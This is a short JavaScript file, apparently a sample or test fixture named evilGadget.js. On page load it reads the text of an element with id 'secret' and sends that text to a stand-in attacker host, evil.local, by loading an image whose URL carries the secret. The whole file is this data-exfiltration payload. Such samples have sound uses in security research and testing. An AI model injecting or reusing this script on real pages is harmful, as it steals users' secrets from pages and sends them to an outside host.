window.onload = function () {
  console.log("evilGadget.js loaded");
  var secret = document.getElementById("secret").innerText;
  var img = new Image();
  img.src = "http://evil.local/steal?secret=" + secret;
};
